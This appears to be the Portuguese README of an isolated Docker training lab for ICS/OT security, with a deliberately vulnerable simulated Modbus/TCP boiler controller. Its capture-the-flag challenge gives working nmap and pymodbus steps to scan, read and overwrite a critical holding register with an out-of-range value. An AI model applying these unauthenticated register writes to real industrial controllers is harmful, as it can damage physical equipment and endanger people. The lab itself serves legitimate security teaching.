# Probatio Labs — Laboratório Virtual de Segurança ICS/OT

Ambiente mínimo viável para treinamento em segurança de Sistemas de Controle
Industrial (ICS) / Tecnologia Operacional (OT). Simula um cenário de
invasão/exploração de um ativo industrial vulnerável por projeto.

---

## Sumário

- [Requisitos](#requisitos)
- [Início rápido](#início-rápido)
- [Arquitetura](#arquitetura)
- [Serviços](#serviços)
- [Rede](#rede)
- [Tutorial (Frontend)](#tutorial-frontend)
- [Desafio 01 — Exploração Modbus/TCP](#desafio-01--exploração-modbustcp)
- [Verificação da flag](#verificação-da-flag)
- [Comandos úteis](#comandos-úteis)
- [Estrutura do projeto](#estrutura-do-projeto)
- [Detalhes técnicos](#detalhes-técnicos)
- [Notas de segurança](#notas-de-segurança)
- [Solução de problemas](#solução-de-problemas)
- [Próximos passos](#próximos-passos)

---

## Requisitos

- Docker Engine 24+
- Docker Compose v2 (`docker compose`, não `docker-compose`)
- Navegador web moderno (Chrome, Firefox, Edge)

---

## Início rápido

```bash
cd probatio-labs
docker compose up --build
```

| Serviço    | URL                          | Descrição                        |
|------------|------------------------------|----------------------------------|
| Frontend   | http://localhost:8080         | Tutorial e validação de flag     |
| Attacker   | http://localhost:7681         | Terminal web (ttyd)              |
| Target     | (só rede interna)            | Servidor Modbus/TCP              |

---

## Arquitetura

```
┌─────────────────────────────────┐
│        default (bridge)         │
│  frontend :8080  attacker :7681 │─────▶ host
└────────────┬────────────────────┘
             │
      ┌──────┴──────────────────────────────┐
      │     ot_lab_net (172.28.0.0/24)      │
      │     internal: true (sem internet)   │
      │                                     │
      │  ┌───────────┐  :502  ┌──────────┐ │
      │  │ attacker   │──────▶│  target   │ │
      │  │172.28.0.10 │       │172.28.0.20│ │
      │  └───────────┘       │Modbus/TCP │ │
      │                      └──────────┘ │
      │                 volume: flag_data  │
      └────────────────────────────────────┘
```

**Fluxo do usuário:**
1. Acessa `http://localhost:8080` → lê o tutorial
2. Clica "Abrir Terminal do Atacante" → abre `localhost:7681` em nova aba
3. Executa o ataque no terminal
4. Volta ao frontend → cola a flag → valida

---

## Serviços

### Frontend (Flask)

- **Container:** `frontend`
- **Porta:** 8080
- **Stack:** Python 3.11 + Flask
- **Responsabilidade:** Servir tutorial, validação de flags
- **Endpoints:**
  - `GET /` — Página principal com tutorial
  - `POST /submit` — Valida flag enviada contra `/flag/flag.txt`
  - `GET /health` — Healthcheck
- **Volume:** `flag_data:/flag:ro` (somente leitura)

### Attacker

- **Container:** `attacker`
- **Porta:** 7681 (ttyd → terminal web)
- **Base:** `debian:bookworm-slim`
- **Ferramentas:** nmap, python3, pymodbus, scapy, netcat, curl
- **Permissões:** `NET_RAW`, `NET_ADMIN` (necessário para scans)
- **Rede:** `default` (port publishing) + `ot_lab_net` (172.28.0.10)

### Target

- **Container:** `target`
- **Porta:** 502 (Modbus/TCP, interna apenas)
- **Base:** `python:3.11-slim`
- **Dependência:** pymodbus==3.6.9
- **Volume:** `flag_data:/flag`
- **Rede:** `ot_lab_net` (172.28.0.20)

---

## Rede

### ot_lab_net

- **Driver:** bridge
- **Subnet:** 172.28.0.0/24
- **Internal:** true (sem acesso à internet)
- **Alocação:**
  - `172.28.0.1` — Gateway Docker
  - `172.28.0.10` — Attacker
  - `172.28.0.20` — Target

### default

- **Driver:** bridge (padrão do Docker)
- **Propósito:** Expor portas do attacker e frontend ao host

---

## Tutorial (Frontend)

O frontend em `http://localhost:8080` contém 5 seções:

1. **Bem-vindo ao Laboratório** — Introdução a ICS/OT
2. **O Cenário** — Descrição do PLC vulnerable
3. **Conceitos Chave** — Modbus/TCP, Holding Registers, Reconhecimento
4. **Seu Desafio** — Passo a passo com link para o terminal
5. **Validar Flag** — Campo de submissão com feedback

---

## Desafio 01 — Exploração Modbus/TCP

### Objetivo

Descobrir o host industrial, identificar o protocolo, ler uma variável
crítica e escrevê-la para um valor fora da faixa operacional.

### Passo 1: Descoberta de hosts

```bash
nmap -sn 172.28.0.0/24
```

Saída esperada: 3 hosts — `.1` (gateway), `.10` (atacante), `.20` (alvo).

### Passo 2: Scan de porta

```bash
nmap -p 502 172.28.0.20
```

Saída esperada: `502/tcp open mbap`

### Passo 3: Ler o registrador crítico

```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("172.28.0.20", port=502)
client.connect()

result = client.read_holding_registers(address=0, count=1, device_id=1)
print(result.registers)  # → [50]

client.close()
```

### Passo 4: Explorar a vulnerabilidade

```python
client = ModbusTcpClient("172.28.0.20", port=502)
client.connect()

client.write_register(address=0, value=200, device_id=1)

client.close()
```

**Regra:** Valor ≥ 150 no register 0 aciona a geração da flag.

### Passo 5: Copiar a flag

A flag é gerada automaticamente pelo watcher no target e salva em
`/flag/flag.txt`. O aluno deve copiá-la do output do terminal ou
via:

```bash
docker compose exec target cat /flag/flag.txt
```

---

## Verificação da flag

### Via frontend

1. Acesse http://localhost:8080
2. Cole a flag no campo "Validar Flag"
3. Clique em "Validar"
4. Mensagem de sucesso ou erro aparece

### Via CLI

```bash
docker compose exec target cat /flag/flag.txt
```

### Resetar o exercício

Para gerar uma nova flag sem reiniciar o container, escreva um valor
na faixa normal (20–80):

```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("172.28.0.20", port=502)
client.connect()
client.write_register(address=0, value=50, device_id=1)
client.close()
```

O watcher detecta o retorno à faixa e reseta o estado interno.

---

## Comandos úteis

### Gerenciamento de containers

```bash
# Subir tudo
docker compose up -d --build

# Parar tudo
docker compose down

# Rebuildar um serviço específico
docker compose build --no-cache frontend
docker compose up -d frontend

# Ver logs
docker compose logs -f attacker
docker compose logs -f target
docker compose logs -f frontend

# Status dos containers
docker compose ps
```

### Debug

```bash
# Entrar no container atacante
docker compose exec attacker bash

# Entrar no container target
docker compose exec target bash

# Verificar se o servidor Modbus está rodando
docker compose exec target python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print('Port 502 open:', s.connect_ex(('127.0.0.1', 502)) == 0)
s.close()
"

# Testar leitura Modbus do host
docker compose exec attacker python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('172.28.0.20', port=502)
c.connect()
print(c.read_holding_registers(address=0, count=1, device_id=1).registers)
c.close()
"

# Verificar rede
docker network inspect probatio-labs_ot_lab_net --format '{{.Internal}}'

# Verificar se target NÃO é acessível do host
timeout 3 bash -c "echo > /dev/tcp/localhost/502" 2>&1 || echo "OK: inacessível"
```

---

## Estrutura do projeto

```
probatio-labs/
├── docker-compose.yml          # Orquestração dos 3 serviços
├── README.md                   # Este arquivo
├── frontend/
│   ├── Dockerfile              # Build do container Flask
│   ├── app.py                  # App Flask (rotas /, /submit, /health)
│   ├── Icon.png                # Ícone do projeto
│   ├── static/
│   │   └── Icon.png            # Ícone servido via Flask
│   └── templates/
│       └── index.html          # Página principal (tutorial + validação)
├── attacker/
│   ├── Dockerfile              # Build do container atacante
│   └── hints.md                # Material de apoio para o aluno
└── target/
    ├── Dockerfile              # Build do container alvo
    └── plc_simulator.py        # Servidor Modbus/TCP vulnerável
```

---

## Detalhes técnicos

### PLC Simulador (`target/plc_simulator.py`)

- **Protocolo:** Modbus/TCP (pymodbus 3.6.9)
- **Porta:** 502
- **Datastore:** 100 holding registers
  - Register 0: valor inicial 50 (crítico)
  - Registers 1–99: zerados
- **Flag:** `FLAG{modbus_no_auth_<hash>}`
  - Hash = SHA-256(UUID aleatório), truncado para 16 chars
  - Gerada por instância (não reaproveitável entre execuções)
- **Watcher:** Thread daemon que monitora o register 0 a cada 1s
  - Valor ≥ 150 → gera flag em `/flag/flag.txt`
  - Valor volta para 20–80 → reseta estado (`flag_written = False`)
- **Device Identification:**
  - Vendor: Probatio Labs
  - Product: Simulated Boiler Controller
  - Model: PSB-2000

### Frontend (`frontend/app.py`)

- **Framework:** Flask 3.1
- **Validação:** Compara flag enviada com conteúdo de `/flag/flag.txt`
- **Volume:** Montado como `:ro` (somente leitura)

### Rede ot_lab_net

- `internal: true` impede acesso à internet
- Attacker em duas redes: `default` (port publishing) + `ot_lab_net`
- Target apenas em `ot_lab_net` (não exposto ao host)

### Versões fixadas

| Dependência    | Versão  |
|----------------|---------|
| pymodbus (target) | 3.6.9 |
| pymodbus (attacker) | latest |
| scapy (attacker) | latest |
| flask (frontend) | latest |
| ttyd (attacker) | latest (binário) |

---

## Notas de segurança

- A rede `ot_lab_net` é isolada (`internal: true`), sem acesso à internet.
- O target não é acessível a partir do host (`localhost:502` falha).
- A flag é efemeramente atrelada à vida do container.
- O laboratório é para fins educacionais — não usar em ambientes de produção.
- As vulnerabilidades são propositais (sem autenticação, sem validação de range).

---

## Solução de problemas

### Terminal ttyd não aceita digitação

O ttyd precisa da flag `--writable`. Verificar o Dockerfile do attacker:

```dockerfile
CMD ["ttyd", "-p", "7681", "--writable", "bash"]
```

### Porta 7681 não funciona no host

Verificar se o container está rodando e se a porta foi publicada:

```bash
docker compose ps
docker inspect attacker --format '{{json .HostConfig.PortBindings}}'
```

### Frontend não conecta com o target

O frontend não se comunica diretamente com o target. A validação
ocorre via volume compartilhado `flag_data`.

### Flag não é gerada

Verificar logs do target:

```bash
docker compose logs target
```

O watcher deve mostrar `[WATCHER] CRITICAL_REGISTER=<valor>`.

### Ícone não atualiza

Rebuildar com `--no-cache`:

```bash
docker compose build --no-cache frontend
docker compose up -d frontend
```

Limpar cache do navegador: `Ctrl+Shift+R`.

---

## Próximos passos

1. **Novos cenários:** duplicar `target/` com simuladores para S7comm,
   DNP3, ou outras classes de vulnerabilidade (credenciais padrão,
   ausência de validação de range, etc.).
2. **Persistência do progresso:** SQLite no MVP para registrar tentativas
   e conquistas dos alunos.
3. **Monitoramento passivo:** container adicional com `tcpdump`/`tshark`
   na mesma rede, sem alterar o comportamento dos outros nós.
4. **Autenticação do frontend:** login básico para identificar alunos.
5. **Ranking:** placar de conquistas por aluno/tempo.
6. **Container de auxílio:** container com referências Modbus, cheatsheets
   e documentação offline.
